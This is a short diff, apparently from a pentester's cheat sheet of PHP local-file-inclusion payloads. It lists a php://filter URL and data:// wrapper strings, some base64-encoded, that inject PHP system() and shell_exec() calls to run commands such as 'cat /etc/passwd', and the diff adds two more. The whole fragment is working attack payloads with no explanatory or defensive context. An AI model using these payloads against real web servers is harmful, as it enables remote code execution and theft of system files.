@@ -11,7 +11,9 @@ http://192.168.1.103:80/index.php?system=php://filter/read=convert.base64-encode
 #?file=php://data                                               #does not work with dotdotpwn
 # data:text/plain,<?php phpinfo(); ?>
 # data:,<?system($_GET['x']);?>&x=ls
+# data:,<?php system($_GET['x']); ?>&x=ls
 # data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=cat /etc/passwd
+# data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir
 # data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d
 # data://text/plain;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4%3D%26x%3Dcat%20%2fetc%2fpasswd
 # data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
